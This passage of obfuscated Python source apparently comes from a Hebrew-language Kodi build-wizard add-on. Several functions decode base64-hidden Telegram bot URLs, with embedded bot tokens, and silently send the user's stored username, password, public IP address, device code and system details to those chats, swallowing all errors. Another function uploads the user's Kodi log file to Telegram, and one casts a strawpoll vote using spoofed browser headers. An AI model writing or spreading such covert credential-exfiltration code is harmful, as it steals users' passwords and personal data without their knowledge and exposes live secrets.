          O0OOOOO000000OOO0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:547
          O00O0OO0O0O0OOOOO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:548
          O00O000O0OOO000OO =OOOO000O00O0OOO0O #line:550
          O0OO00OOO0O00OO00 =OOO0O0O0O00O0OO00 #line:551
          OOO0000O00O00O00O =requests .get (O0OOOOO000000OOO0 +que ('ההתקנה לא זמינה כעת, נסו שוב מאוחר יותר :')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O00O000O0OOO000OO +que (' סיסמה: ')+O0OO00OOO0O00OO00 +que (' קודי: ')+OOOO0O0OO000O0OO0 +que (' כתובת: ')+O00O0OO0O0O0OOOOO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OOO0OO000OO0OOOOO ).json ()#line:553
       except :pass #line:555
def gomsb_go ():#line:556
       try :#line:557
          import json ,requests #line:558
          wiz .log ('FRESH MESSAGE')#line:559
          OO00OO0OOO0OO0O0O =(wiz .getS ("user"))#line:560
          OOO0OO00O00O0O00O =(wiz .getS ("pass"))#line:561
          O00000O0OOOOOO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:562
          OO000OOO0OOOOO0OO =platform .uname ()#line:563
          O00OO000OOOOO00OO =OO000OOO0OOOOO0OO [1 ]#line:564
          O000OOO0O0OOOO0OO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:565
          O0O000OO00000OOO0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:566
          OO0OOO00OOOO0OO00 =OO00OO0OOO0OO0O0O #line:568
          O0OOOOO00OO0O0O0O =OOO0OO00O00O0O00O #line:569
          O00OOO0OOO0O0OOO0 =requests .get (O000OOO0O0OOOO0OO +que ('ההורדה חסומה: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO0OOO00OOOO0OO00 +que (' סיסמה: ')+O0OOOOO00OO0O0O0O +que (' קודי: ')+O00000O0OOOOOO0O0 +que (' כתובת: ')+O0O000OO00000OOO0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O00OO000OOOOO00OO ).json ()#line:571
       except :pass #line:573
def gomsb_go2 (OO00OOO000O0O00OO ):#line:574
       try :#line:575
          import json ,requests #line:576
          wiz .log ('FRESH MESSAGE')#line:577
          OOO00OOO0O00O0OOO =(wiz .getS ("user"))#line:578
          O000OOOO0OOO000OO =(wiz .getS ("pass"))#line:579
          O000OO0O00O000O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:580
          O0O0O00000O000OO0 =platform .uname ()#line:581
          O000O0O0OO00O0O0O =O0O0O00000O000OO0 [1 ]#line:582
          OO0O0OOO00O0O0O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:583
          OOO000000000OOOOO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:584
          O0OO000O0O0O0O000 =OOO00OOO0O00O0OOO #line:586
          OOOOO00OO0OO00000 =O000OOOO0OOO000OO #line:587
          O0OOO0OOOOOOO0000 =requests .get (OO0O0OOO00O0O0O0O +que ('חסימה על ידי: '+OO00OOO000O0O00OO +' -')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0OO000O0O0O0O000 +que (' סיסמה: ')+OOOOO00OO0OO00000 +que (' קודי: ')+O000OO0O00O000O00 +que (' כתובת: ')+OOO000000000OOOOO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O000O0O0OO00O0O0O +que (' גירסת ויזארד: ')+VERSION ).json ()#line:589
       except :pass #line:590
def read_firebase_c (OO0000O00OO0OO00O ):#line:591
    from resources .libs import firebase #line:592
    OO000O00OOO0OOOO0 =firebase .FirebaseApplication ('https://zxcsd-3bae5-default-rtdb.firebaseio.com',None )#line:593
    OOOO00O00O0OO0OO0 =OO000O00OOO0OOOO0 .get ('/',None )#line:594
    if OO0000O00OO0OO00O in OOOO00O00O0OO0OO0 :#line:595
        return OOOO00O00O0OO0OO0 [OO0000O00OO0OO00O ]#line:596
    else :#line:597
        return {}#line:598
def telecode ():#line:599
    O0OO0OO00OO0O0O0O =read_firebase_c ('telecode')#line:600
    OO000OOO000O0O000 =[]#line:601
    for OO0O0O0O0OO00000O in O0OO0OO00OO0O0O0O :#line:602
        OO00000OO0OOO0O00 =O0OO0OO00OO0O0O0O [OO0O0O0O0OO00000O ]#line:603
        OO000OOO000O0O000 .append ((OO00000OO0OOO0O00 ['pin']))#line:604
    for OO0O000O00OOO000O in OO000OOO000O0O000 :#line:605
       return OO0O000O00OOO000O #line:606
def check_firebase ():#line:610
     if len (wiz .getS ("sync_user"))>0 and wiz .getS ("pass2")=='true':#line:612
        try :#line:614
            O0O0OO000O0OOOOO0 =read_firebase ('table_name')#line:615
        except :#line:616
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Anonymous TV'),'[COLOR %s]שם המשתמש של הסנכרון שגוי[/COLOR]'%COLOR2 )#line:617
            OOOO0O0000OOOO00O =DIALOG .yesno ('בעיה בשם המשתמש של הסנכרון',"שם המשתמש של [B][COLOR red]הסנכרון[/COLOR][/B] אינו נכון,"+'\n'+"הכנס את שם המשתמש כעת.","ביטול",yeslabel ='[B][COLOR yellow]אישור[/COLOR][/B]')#line:619
            if BUILDNAME =="":#line:622
                xbmc .executebuiltin ("ActivateWindow(home)")#line:623
            if OOOO0O0000OOOO00O :#line:624
               ADDON .openSettings ()#line:625
               sys .exit ()#line:626
            else :#line:627
             sys .exit ()#line:628
def indicatorVotes ():#line:630
   try :#line:631
        import requests #line:632
        O0O0O0O00OOO0OOO0 ='42244359'#line:633
        O0OOO00O00OO000OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0O0O00OOO0OOO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:645
        OO0O00OOO0O0O0OOO ='247106541'#line:647
        OOOOO0O00O0O00OO0 ={'options':OO0O00OOO0O0O0OOO }#line:653
        OOOO00000OO000O00 =requests .post ('https://www.strawpoll.me/'+O0O0O0O00OOO0OOO0 ,headers =O0OOO00O00OO000OO ,data =OOOOO0O00O0O00OO0 )#line:655
   except :pass #line:656
def autotrakt ():#line:657
    OOOOO0OOOO0OOO000 =(wiz .getS ("auto_trk"))#line:658
    if OOOOO0OOOO0OOO000 =='true':#line:659
       from resources .libs import trk_aut #line:660
def traktsync ():#line:662
     OOO000O0OO0000000 =(wiz .getS ("auto_trk"))#line:663
     if OOO000O0OO0000000 =='false':#line:664
       ADDON .openSettings ()#line:665
     from resources .libs import trk_aut #line:666
def imdb_synck ():#line:668
   try :#line:669
     O00O000O000OOOO00 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:670
     OO000000000OO0O0O =xbmcaddon .Addon ('plugin.video.gaia')#line:671
     OO000OO0OO0O00OOO =(wiz .getS ("imdb_sync"))#line:672
     O00OO00O00000O000 ="imdb.user"#line:673
     OOOOOOOOOOOO0O000 ="accounts.informants.imdb.user"#line:674
     O00O000O000OOOO00 .setSetting (O00OO00O00000O000 ,str (OO000OO0OO0O00OOO ))#line:675
     OO000000000OO0O0O .setSetting ('accounts.informants.imdb.enabled','true')#line:676
     OO000000000OO0O0O .setSetting (OOOOOOOOOOOO0O000 ,str (OO000OO0OO0O00OOO ))#line:677
   except :pass #line:678
def dis_or_enable_addon (OO000O0OOOO0OOO0O ,OO00OOO000000OOO0 ,enable ="true"):#line:680
    import json #line:681
    OOO00O000OOOO0O00 ='"%s"'%OO000O0OOOO0OOO0O #line:682
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO000O0OOOO0OOO0O )and enable =="true":#line:683
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO000O0OOOO0OOO0O )#line:685
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO000O0OOOO0OOO0O )and enable =="false":#line:686
        return xbmc .log ("### Skipped %s, reason = not installed"%OO000O0OOOO0OOO0O )#line:687
    else :#line:688
        O000000OO0O0OOO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO00O000OOOO0O00 ,enable )#line:689
        O00OOOO0O0OOO00O0 =xbmc .executeJSONRPC (O000000OO0O0OOO00 )#line:690
        O0O0O00000O00O0OO =json .loads (O00OOOO0O0OOO00O0 )#line:691
        if enable =="true":#line:692
            xbmc .log ("### Enabled %s, response = %s"%(OO000O0OOOO0OOO0O ,O0O0O00000O00O0OO ))#line:693
        else :#line:694
            xbmc .log ("### Disabled %s, response = %s"%(OO000O0OOOO0OOO0O ,O0O0O00000O00O0OO ))#line:695
    if OO00OOO000000OOO0 =='auto':#line:696
     return True #line:697
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:698
def howsentlog ():#line:702
       try :#line:704
          import json ,requests #line:705
          OO0000OO00000OOOO =(wiz .getS ("user"))#line:706
          O0O00OOOOO0OO0OOO =(wiz .getS ("pass"))#line:707
          O00OOOO00O000OOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:708
          O0OO00O0O000OOO0O =platform .uname ()#line:709
          OOO00O0OO00O0O000 =O0OO00O0O000OOO0O [1 ]#line:710
          OO0O0OOOOOOO0OOOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode ('utf-8')#line:711
          OO0O0000O0OOOOOO0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:712
          O00OOO0O0O00O000O =OO0000OO00000OOOO #line:714
          OO00OO00O00O00O00 =O0O00OOOOO0OO0OOO #line:715
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:716
          xbmc .sleep (1500 )#line:717
          OO00O0OOOOO0O00OO =xbmc .getInfoLabel ('System.OSVersionInfo')#line:718
          OOOOOOOO00OOOO0OO =requests .get (OO0O0OOOOOOO0OOOO +que ('שלח לוג: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O00OOO0O0O00O000O +que (' סיסמה: ')+OO00OO00O00O00O00 +que (' קודי: ')+O00OOOO00O000OOOO +que (' כתובת: ')+OO0O0000O0OOOOOO0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OOO00O0OO00O0O000 +que (' גירסת ויזארד: ')+VERSION ).json ()#line:721
       except :pass #line:723
def logsend ():#line:725
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:726
      xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:727
      try :#line:728
          OOO0000O00OO00OOO =xbmcgui .DialogBusy ()#line:729
          OOO0000O00OO00OOO .create ()#line:730
      except :pass #line:731
      if not os .path .exists (translatepath ("special://home/addons/")+'script.module.requests'):#line:732
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:733
        sys .exit ()#line:734
      howsentlog ()#line:736
      import requests #line:737
      if xbmc .getCondVisibility ('system.platform.windows'):#line:738
         O0OO0O00OO0O0000O =xbmc .translatePath ('special://home/kodi.log')#line:739
         OOOOO00OO0O0OO00O ={'chat_id':(None ,'-274262389'),'document':(O0OO0O00OO0O0000O ,open (O0OO0O00OO0O0000O ,'rb')),}#line:743
         O000OOO00OOOOO0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:744
         OO00OO0O00OOO0OO0 =requests .post (O000OOO00OOOOO0O0 ,files =OOOOO00OO0O0OO00O )#line:746
      elif xbmc .getCondVisibility ('system.platform.android'):#line:747
           O0OO0O00OO0O0000O =xbmc .translatePath ('special://temp/kodi.log')#line:748
           OOOOO00OO0O0OO00O ={'chat_id':(None ,'-274262389'),'document':(O0OO0O00OO0O0000O ,open (O0OO0O00OO0O0000O ,'rb')),}#line:752
           O000OOO00OOOOO0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:753
           OO00OO0O00OOO0OO0 =requests .post (O000OOO00OOOOO0O0 ,files =OOOOO00OO0O0OO00O )#line:755
      else :#line:756
           O0OO0O00OO0O0000O =xbmc .translatePath ('special://kodi.log')#line:757
           OOOOO00OO0O0OO00O ={'chat_id':(None ,'-274262389'),'document':(O0OO0O00OO0O0000O ,open (O0OO0O00OO0O0000O ,'rb')),}#line:761
           O000OOO00OOOOO0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:762
           OO00OO0O00OOO0OO0 =requests .post (O000OOO00OOOOO0O0 ,files =OOOOO00OO0O0OO00O )#line:764
      xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:765
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:766
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:774
theme_dragon ='https://dragon-user-default-rtdb.firebaseio.com'#line:775
black_nox ='https://blacklist-user-default-rtdb.firebaseio.com'#line:776
def parseDOM2 (O0OO00OOOOOO0000O ,name =u"",attrs ={},ret =False ):#line:778
	if isinstance (O0OO00OOOOOO0000O ,str ):#line:781
		try :#line:782
			O0OO00OOOOOO0000O =[O0OO00OOOOOO0000O .decode ("utf-8")]#line:783
		except :#line:784
			O0OO00OOOOOO0000O =[O0OO00OOOOOO0000O ]#line:785
	elif isinstance (O0OO00OOOOOO0000O ,str ):#line:786
		O0OO00OOOOOO0000O =[O0OO00OOOOOO0000O ]#line:787
	elif not isinstance (O0OO00OOOOOO0000O ,list ):#line:788
		return u""#line:789
	if not name .strip ():#line:791
		return u""#line:792
	OOOO0OOOO000O00OO =[]#line:794
	for OOO0OO0O00O0OO00O in O0OO00OOOOOO0000O :#line:795
		OOO0OOO0OO00O0O0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO0OO0O00O0OO00O )#line:796
		for OO0OOO0O0O00O0OO0 in OOO0OOO0OO00O0O0O :#line:797
			OOO0OO0O00O0OO00O =OOO0OO0O00O0OO00O .replace (OO0OOO0O0O00O0OO0 ,OO0OOO0O0O00O0OO0 .replace ("\n"," "))#line:798
		OO00O0O00O000OO00 =[]#line:800
		for OOO0O00000OOO0O00 in attrs :#line:801
			O0O0000OOO00OO0OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0O00000OOO0O00 +'=[\'"]'+attrs [OOO0O00000OOO0O00 ]+'[\'"].*?>))',re .M |re .S ).findall (OOO0OO0O00O0OO00O )#line:802
			if len (O0O0000OOO00OO0OO )==0 and attrs [OOO0O00000OOO0O00 ].find (" ")==-1 :#line:803
				O0O0000OOO00OO0OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0O00000OOO0O00 +'='+attrs [OOO0O00000OOO0O00 ]+'.*?>))',re .M |re .S ).findall (OOO0OO0O00O0OO00O )#line:804
			if len (OO00O0O00O000OO00 )==0 :#line:806
				OO00O0O00O000OO00 =O0O0000OOO00OO0OO #line:807
				O0O0000OOO00OO0OO =[]#line:808
			else :#line:809
				OO0OOO0O0O000OO0O =list (range (len (OO00O0O00O000OO00 )))#line:810
				OO0OOO0O0O000OO0O .reverse ()#line:811
				for OOOOO00O0O000OO0O in OO0OOO0O0O000OO0O :#line:812
					if not OO00O0O00O000OO00 [OOOOO00O0O000OO0O ]in O0O0000OOO00OO0OO :#line:813
						del (OO00O0O00O000OO00 [OOOOO00O0O000OO0O ])#line:814
		if len (OO00O0O00O000OO00 )==0 and attrs =={}:#line:816
			OO00O0O00O000OO00 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO0OO0O00O0OO00O )#line:817
			if len (OO00O0O00O000OO00 )==0 :#line:818
				OO00O0O00O000OO00 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO0OO0O00O0OO00O )#line:819
		if isinstance (ret ,str ):#line:821
			O0O0000OOO00OO0OO =[]#line:822
			for OO0OOO0O0O00O0OO0 in OO00O0O00O000OO00 :#line:823
				O0O0OOO0OO00O0OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0OOO0O0O00O0OO0 )#line:824
				if len (O0O0OOO0OO00O0OOO )==0 :#line:825
					O0O0OOO0OO00O0OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0OOO0O0O00O0OO0 )#line:826
				for O0OOO00O0O0OOOO0O in O0O0OOO0OO00O0OOO :#line:827
					OOO00O0O000OOO000 =O0OOO00O0O0OOOO0O [0 ]#line:828
					if OOO00O0O000OOO000 in "'\"":#line:829
						if O0OOO00O0O0OOOO0O .find ('='+OOO00O0O000OOO000 ,O0OOO00O0O0OOOO0O .find (OOO00O0O000OOO000 ,1 ))>-1 :#line:830
							O0OOO00O0O0OOOO0O =O0OOO00O0O0OOOO0O [:O0OOO00O0O0OOOO0O .find ('='+OOO00O0O000OOO000 ,O0OOO00O0O0OOOO0O .find (OOO00O0O000OOO000 ,1 ))]#line:831
						if O0OOO00O0O0OOOO0O .rfind (OOO00O0O000OOO000 ,1 )>-1 :#line:833
							O0OOO00O0O0OOOO0O =O0OOO00O0O0OOOO0O [1 :O0OOO00O0O0OOOO0O .rfind (OOO00O0O000OOO000 )]#line:834
					else :#line:835
						if O0OOO00O0O0OOOO0O .find (" ")>0 :#line:836
							O0OOO00O0O0OOOO0O =O0OOO00O0O0OOOO0O [:O0OOO00O0O0OOOO0O .find (" ")]#line:837
						elif O0OOO00O0O0OOOO0O .find ("/")>0 :#line:838
							O0OOO00O0O0OOOO0O =O0OOO00O0O0OOOO0O [:O0OOO00O0O0OOOO0O .find ("/")]#line:839
						elif O0OOO00O0O0OOOO0O .find (">")>0 :#line:840
							O0OOO00O0O0OOOO0O =O0OOO00O0O0OOOO0O [:O0OOO00O0O0OOOO0O .find (">")]#line:841
					O0O0000OOO00OO0OO .append (O0OOO00O0O0OOOO0O .strip ())#line:843
			OO00O0O00O000OO00 =O0O0000OOO00OO0OO #line:844
		else :#line:845
			O0O0000OOO00OO0OO =[]#line:846
			for OO0OOO0O0O00O0OO0 in OO00O0O00O000OO00 :#line:847
				O00O00OOO0O00000O =u"</"+name #line:848
				O0O0OO000000OO0O0 =OOO0OO0O00O0OO00O .find (OO0OOO0O0O00O0OO0 )#line:850
				O0OO0O00OO0OOOOO0 =OOO0OO0O00O0OO00O .find (O00O00OOO0O00000O ,O0O0OO000000OO0O0 )#line:851
				O0O0O000O0OOOO000 =OOO0OO0O00O0OO00O .find ("<"+name ,O0O0OO000000OO0O0 +1 )#line:852
				while O0O0O000O0OOOO000 <O0OO0O00OO0OOOOO0 and O0O0O000O0OOOO000 !=-1 :#line:854
					OOOOO00OOO0O0OO00 =OOO0OO0O00O0OO00O .find (O00O00OOO0O00000O ,O0OO0O00OO0OOOOO0 +len (O00O00OOO0O00000O ))#line:855
					if OOOOO00OOO0O0OO00 !=-1 :#line:856
						O0OO0O00OO0OOOOO0 =OOOOO00OOO0O0OO00 #line:857
					O0O0O000O0OOOO000 =OOO0OO0O00O0OO00O .find ("<"+name ,O0O0O000O0OOOO000 +1 )#line:858
				if O0O0OO000000OO0O0 ==-1 and O0OO0O00OO0OOOOO0 ==-1 :#line:860
					O0000OOOOOO00OO0O =u""#line:861
				elif O0O0OO000000OO0O0 >-1 and O0OO0O00OO0OOOOO0 >-1 :#line:862
					O0000OOOOOO00OO0O =OOO0OO0O00O0OO00O [O0O0OO000000OO0O0 +len (OO0OOO0O0O00O0OO0 ):O0OO0O00OO0OOOOO0 ]#line:863
				elif O0OO0O00OO0OOOOO0 >-1 :#line:864
					O0000OOOOOO00OO0O =OOO0OO0O00O0OO00O [:O0OO0O00OO0OOOOO0 ]#line:865
				elif O0O0OO000000OO0O0 >-1 :#line:866
					O0000OOOOOO00OO0O =OOO0OO0O00O0OO00O [O0O0OO000000OO0O0 +len (OO0OOO0O0O00O0OO0 ):]#line:867
				if ret :#line:869
					O00O00OOO0O00000O =OOO0OO0O00O0OO00O [O0OO0O00OO0OOOOO0 :OOO0OO0O00O0OO00O .find (">",OOO0OO0O00O0OO00O .find (O00O00OOO0O00000O ))+1 ]#line:870
					O0000OOOOOO00OO0O =OO0OOO0O0O00O0OO0 +O0000OOOOOO00OO0O +O00O00OOO0O00000O #line:871
				OOO0OO0O00O0OO00O =OOO0OO0O00O0OO00O [OOO0OO0O00O0OO00O .find (O0000OOOOOO00OO0O ,OOO0OO0O00O0OO00O .find (OO0OOO0O0O00O0OO0 ))+len (O0000OOOOOO00OO0O ):]#line:873
				O0O0000OOO00OO0OO .append (O0000OOOOOO00OO0O )#line:874
			OO00O0O00O000OO00 =O0O0000OOO00OO0OO #line:875
		OOOO0OOOO000O00OO +=OO00O0O00O000OO00 #line:876
	return OOOO0OOOO000O00OO #line:878
def addItem (OOOOOO000O0OO0O00 ,O0O0O0O00OO00O0OO ,OOO0000OO0OO0O000 ,OOOO0O0O00OO0O000 ,OO00OOOO0O0O0OOOO ,description =None ):#line:880
    if description ==None :description =''#line:881
    description ='[COLOR white]'+description +'[/COLOR]'#line:882
    O00O00OOOO00O0OO0 =sys .argv [0 ]+"?url="+que (O0O0O0O00OO00O0OO )+"&mode="+str (OOO0000OO0OO0O000 )+"&name="+que (OOOOOO000O0OO0O00 )+"&iconimage="+que (OOOO0O0O00OO0O000 )+"&fanart="+que (OO00OOOO0O0O0OOOO )#line:883
    O0O0000O0O00OO0OO =True #line:884
    try :#line:885
        OO0000OO0OOO0OO0O =xbmcgui .ListItem (OOOOOO000O0OO0O00 ,iconImage =OOOO0O0O00OO0O000 ,thumbnailImage =OOOO0O0O00OO0O000 )#line:886
    except :#line:887
        OO0000OO0OOO0OO0O =xbmcgui .ListItem (OOOOOO000O0OO0O00 )#line:888
        OO0000OO0OOO0OO0O .setArt ({'thumb':OOOO0O0O00OO0O000 ,'fanart':OOOO0O0O00OO0O000 ,'DefaultFolder.png':OOOO0O0O00OO0O000 })#line:889
    OO0000OO0OOO0OO0O .setInfo (type ="Video",infoLabels ={"Title":OOOOOO000O0OO0O00 ,"Plot":description })#line:890
    OO0000OO0OOO0OO0O .setProperty ("fanart_Image",OO00OOOO0O0O0OOOO )#line:891
    OO0000OO0OOO0OO0O .setProperty ("icon_Image",OOOO0O0O00OO0O000 )#line:892
    O0O0000O0O00OO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O00OOOO00O0OO0 ,listitem =OO0000OO0OOO0OO0O ,isFolder =False )#line:893
    return O0O0000O0O00OO0OO #line:894
def decode (OOO000O0OO0OO0O0O ,O00OOOO0000O0OOO0 ):#line:898
    import base64 #line:899
    OOOO00000OOOO00O0 =[]#line:900
    if (len (OOO000O0OO0OO0O0O ))!=4 :#line:902
     return 10 #line:903
    O00OOOO0000O0OOO0 =base64 .urlsafe_b64decode (O00OOOO0000O0OOO0 )#line:904
    for OOO00O00000O0O0O0 in range (len (O00OOOO0000O0OOO0 )):#line:906
        O0OO0OO0OO00O0O0O =OOO000O0OO0OO0O0O [OOO00O00000O0O0O0 %len (OOO000O0OO0OO0O0O )]#line:907
        try :#line:908
          OO0OO0O000OOOO0OO =chr ((256 +ord (O00OOOO0000O0OOO0 [OOO00O00000O0O0O0 ])-ord (O0OO0OO0OO00O0O0O ))%256 )#line:909
        except :#line:910
          OO0OO0O000OOOO0OO =chr ((256 +(O00OOOO0000O0OOO0 [OOO00O00000O0O0O0 ])-ord (O0OO0OO0OO00O0O0O ))%256 )#line:911
        OOOO00000OOOO00O0 .append (OO0OO0O000OOOO0OO )#line:912
    return "".join (OOOO00000OOOO00O0 )#line:913
def tmdb_list (OOO0O0O0O0OOOO0O0 ):#line:914
    O0O0O0000O0O000OO =decode ("7643",OOO0O0O0O0OOOO0O0 )#line:917
    return int (O0O0O0000O0O000OO )#line:920
def check_pass_step2 (OOO0O0000O0OO0OOO ):#line:921
    O0OOOOOO0OO000O0O =[]#line:922
    OOOOOO000O0O00O00 =0 #line:923
    try :#line:924
        OOOOOO00000OO000O =read_skin ('password')#line:925
        for O000O000O0OOOOOO0 in OOOOOO00000OO000O :#line:926
            O0O00O0OO0O000OOO =OOOOOO00000OO000O [O000O000O0OOOOOO0 ]#line:927
            O0OOOOOO0OO000O0O .append ((O0O00O0OO0O000OOO ['password']))#line:928
    except Exception as O00OOOOO00O000OO0 :#line:929
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (O00OOOOO00O000OO0 ))#line:930
    for OO0OOOOO0000O0O00 in O0OOOOOO0OO000O0O :#line:931
        if OO0OOOOO0000O0O00 .split ()[0 ].lower ()==OOO0O0000O0OO0OOO :#line:933
            OOOOOO000O0O00O00 =1 #line:934
            break #line:935
    if OOOOOO000O0O00O00 ==0 :#line:936
        return ''#line:937
    return 'ok'#line:938
def check_pass ():#line:939
    OOOO0OO0OO0OO0000 =wiz .getS ("pass")#line:950
    if not len (wiz .getS ("pass"))>0 :#line:951
        O0O0O0O0O000000O0 =xbmcgui .Dialog ()#line:952
        OOOO0OO0OO0OO0000 =O0O0O0O0O000000O0 .numeric (0 ,'הכנס סיסמה - '+'קוד מכשיר: '+'[COLOR yellow]'+HARDWAER +'[/COLOR]')#line:954
        wiz .setS ("pass",OOOO0OO0OO0OO0000 )#line:958
        if OOOO0OO0OO0OO0000 =='':#line:959
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:960
            sys .exit ()#line:961
    O00000O00OO0OOO0O =OOOO0OO0OO0OO0000 #line:962
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:964
        from math import sqrt #line:966
        OOO00OO00O0O0O0OO =tmdb_list (TMDB_NEW_API )#line:967
        try :#line:968
            O00O0O0O00000O000 =str ((getHwAddr ('eth0'))*OOO00OO00O0O0O0OO )#line:969
            OOOO0OOO000O000O0 =int (O00O0O0O00000O000 [1 ]+O00O0O0O00000O000 [2 ]+O00O0O0O00000O000 [5 ]+O00O0O0O00000O000 [7 ])#line:970
            O0O0O00O0O000O000 =(str (round (sqrt ((OOOO0OOO000O000O0 *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:971
            if '.'in O0O0O00O0O000O000 :#line:973
             O0O0O00O0O000O000 =(str (round (sqrt ((OOOO0OOO000O000O0 *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:974
        except :#line:975
         OOOO0OOO000O000O0 =''#line:976
         O0O0O00O0O000O000 =''#line:977
        if O00000O00OO0OOO0O ==O0O0O00O0O000O000 :#line:978
            xbmc .executebuiltin ('Container.Refresh')#line:979
            return 'ok'#line:980
        elif check_pass_step2 (O00000O00OO0OOO0O )=='ok':#line:982
             xbmc .executebuiltin ('Container.Refresh')#line:983
             return 'ok'#line:984
        else :#line:985
            wiz .setS ("pass",'')#line:986
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:987
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]סיסמה שגויה[/COLOR]"%COLOR2 )#line:988
            xbmc .executebuiltin ('Container.Refresh')#line:990
            sys .exit ()#line:991
        return 'ok'#line:992
    else :#line:994
           if check_pass_step2 (O00000O00OO0OOO0O )=='ok':#line:995
             return 'ok'#line:997
           else :#line:998
             xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:999
def disply_hwr ():#line:1000
   try :#line:1001
    OO00OO00000OO0O00 =tmdb_list (TMDB_NEW_API )#line:1002
